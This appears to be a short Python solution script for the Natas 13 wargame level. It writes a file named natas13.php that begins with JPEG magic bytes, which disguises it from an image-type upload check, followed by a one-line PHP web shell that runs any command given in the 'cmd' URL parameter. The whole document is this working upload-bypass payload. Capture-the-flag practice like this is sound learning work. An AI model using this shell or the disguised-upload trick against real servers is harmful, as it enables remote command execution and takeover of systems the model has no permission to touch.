
magic_hex = b"\xFF\xD8\xFF\xE0"
PHP = b'<? passthru($_GET["cmd"]); ?>'

with open('natas13.php', 'wb') as f:
    f.write(magic_hex+PHP)